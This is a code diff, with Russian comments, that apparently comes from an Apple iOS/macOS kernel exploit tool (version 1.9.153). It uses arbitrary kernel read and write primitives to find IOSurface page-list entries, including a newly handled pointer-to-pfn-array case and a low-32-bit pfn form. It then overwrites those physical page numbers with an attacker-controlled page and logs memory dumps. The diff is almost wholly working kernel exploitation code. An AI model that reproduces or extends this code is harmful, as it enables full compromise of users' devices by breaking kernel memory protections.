@@ -5862,7 +5862,15 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t ro = kp_untag_ptr(early_kread64(c + 0x178));
         if (!kpLooksLikeKernelPointer(ro)) return NO;
         uint64_t q = early_kread64(ro + 0x18);
-        return (uint32_t)(q >> 32) == pfn32 && (uint32_t)q >= 1 && (uint32_t)q <= 8;
+        if ((uint32_t)(q >> 32) == pfn32 && (uint32_t)q >= 1 && (uint32_t)q <= 8) return YES;
+        // 1.9.153: [rangeObj+0x18] может быть УКАЗАТЕЛЕМ на массив pfn, а не самим
+        // массивом — прогон 1.9.152: поверхность найдена, слотов нет.
+        uint64_t arrP = kp_untag_ptr(q);
+        if (kpLooksLikeKernelPointer(arrP) && (uint32_t)(arrP & 0x3fff) + 8 <= 0x4000) {
+            uint64_t q2 = early_kread64(arrP);
+            if ((uint32_t)(q2 >> 32) == pfn32 && (uint32_t)q2 >= 1 && (uint32_t)q2 <= 8) return YES;
+        }
+        return NO;
     };
     BOOL (^surfFull)(uint64_t) = ^BOOL(uint64_t c) {
         if (surfFast(c)) return YES;
@@ -6210,9 +6218,23 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // oracle). Все копии page-list'а: сам объект (0x400), rangeObj(+0x178),
     // XPF ranges(+0x360 если ptr, gate по rangeCount +0x3a4). Окно churn-backlog.
     if (surfVA && !nSlots) {
-        uint64_t objs[3] = { surfVA, 0, 0 };
+        uint64_t objs[4] = { surfVA, 0, 0, 0 };
         uint64_t ro = kp_untag_ptr(early_kread64(surfVA + 0x178));
-        if (kpLooksLikeKernelPointer(ro)) objs[1] = ro;
+        if (kpLooksLikeKernelPointer(ro)) {
+            objs[1] = ro;
+            // 1.9.153: [rangeObj+0x18] может быть указателем на массив pfn
+            uint64_t q18 = early_kread64(ro + 0x18);
+            uint64_t arrP = kp_untag_ptr(q18);
+            kpNote(r, [NSString stringWithFormat:@"  rangeObj %#llx: [+0x18]=%#018llx%@",
+                      (unsigned long long)ro, (unsigned long long)q18,
+                      kpLooksLikeKernelPointer(arrP) ? @" (ptr → массив)" : @" (значение)"]);
+            if (kpLooksLikeKernelPointer(arrP) && (uint32_t)(arrP & 0x3fff) + 8 <= 0x4000) objs[3] = arrP;
+            if ((uint32_t)(ro & 0x3fff) + 0x68 <= 0x4000) {
+                for (uint32_t o = 0; o + 8 <= 0x60; o += 8)
+                    kpNote(r, [NSString stringWithFormat:@"    ro+%#04x: %#018llx", o,
+                              (unsigned long long)early_kread64(ro + o)]);
+            }
+        }
         uint64_t rcnt = early_kread64(surfVA + 0x3a4);
         uint64_t xr = early_kread64(surfVA + 0x360);
         uint64_t xru = kp_untag_ptr(xr);
@@ -6220,7 +6242,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         kpNote(r, [NSString stringWithFormat:@"  IOSurface %#llx: rangeObj(+0x178)=%#llx ranges(+0x360)=%#llx rangeCount(+0x3a4)=%llu",
                   (unsigned long long)surfVA, (unsigned long long)ro,
                   (unsigned long long)xr, (unsigned long long)rcnt]);
-        for (int k = 0; k < 3 && nSlots < 8; k++) {
+        for (int k = 0; k < 4 && nSlots < 8; k++) {
             uint64_t ob = objs[k];
             if (!ob) continue;
             uint32_t lim = (k == 0) ? 0x400 : 0x100;
@@ -6230,6 +6252,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 if ((uint32_t)(q >> 32) == pfn32) form = 1;       // {pfn32, pagecount}
                 else if (q == backingPA) form = 2;                // IOAddressRange.addr
                 else if (q == (backingPA >> 14)) form = 3;        // pfn64
+                else if ((uint32_t)q == pfn32) form = 4;          // pfn в low32
                 if (!form) continue;
                 BOOL dup = NO;
                 for (int j = 0; j < nSlots; j++) if (slotVAs[j] == ob + o) { dup = YES; break; }
@@ -6248,7 +6271,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             for (int j = 0; j < nSlots; j++) {
                 uint64_t newQ = (slotForm[j] == 1)
                               ? (((uint64_t)ctlPFN << 32) | (origQs[j] & 0xFFFFFFFFULL))
-                              : (slotForm[j] == 2) ? ctlPA : (ctlPA >> 14);
+                              : (slotForm[j] == 2) ? ctlPA
+                              : (slotForm[j] == 3) ? (ctlPA >> 14)
+                              : ((origQs[j] & 0xFFFFFFFF00000000ULL) | (uint64_t)ctlPFN);
                 early_kwrite64(slotVAs[j], newQ);
                 uint64_t rb = early_kread64(slotVAs[j]);
                 if (rb == newQ) stuck++;
